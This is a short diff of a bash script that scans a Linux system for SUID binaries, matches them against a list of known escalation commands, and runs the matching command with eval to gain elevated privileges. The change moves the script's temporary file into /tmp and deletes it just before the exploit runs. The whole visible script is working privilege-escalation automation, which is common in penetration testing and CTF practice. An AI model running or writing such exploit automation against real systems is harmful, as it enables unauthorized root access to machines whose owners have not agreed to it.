@@ -8,12 +8,13 @@ find / -perm -4000 -type f 2>/dev/null | sed 's:.*/::' | (while read s; do
         done;
     done;
     uniq=($(printf "%s\n" "${uncleanList[@]}" | sort -u ))
-    echo ${uniq[@]} > output)
-    echo "Possible exploitable suid's: " $(cat output)
-    for i in $(cat output);do
+    echo ${uniq[@]} > /tmp/output)
+    echo "Possible exploitable suid's: " $(cat /tmp/output)
+    for i in $(cat /tmp/output);do
         for ((suid = 0; suid < ${#suidGTFO[@]}; suid++));do
             if [[ "${suidGTFO[$suid]}" == *"$i"* ]]; then
                 echo "Exploiting using command:" ${suidGTFO[$suid]}
+                rm /tmp/output
                 eval ${suidGTFO[$suid]}
                 fi
         done;
